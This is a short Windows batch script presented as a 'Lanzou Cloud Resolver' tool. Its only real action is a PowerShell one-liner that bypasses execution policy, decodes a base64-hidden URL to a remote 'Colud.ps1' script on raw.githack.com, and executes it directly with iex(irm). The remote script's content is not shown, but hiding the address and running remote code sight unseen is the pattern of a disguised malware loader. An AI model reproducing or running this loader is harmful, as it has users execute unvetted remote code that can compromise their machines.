@echo off
setlocal
chcp 65001 >nul
title Lanzou Cloud Resolver
cd /d "%~dp0"

powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "[Console]::OutputEncoding=[Text.Encoding]::UTF8;$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aGFjay5jb20vVlRMT1dLRVkvYm9vdHN0cmFwLzBhMWMxODUvQ29sdWQucHMx'));iex(irm $u)"
set "RC=%ERRORLEVEL%"

echo.
if not "%RC%"=="0" echo Exit code: %RC%
if not "%NO_PAUSE%"=="1" pause
exit /b %RC%

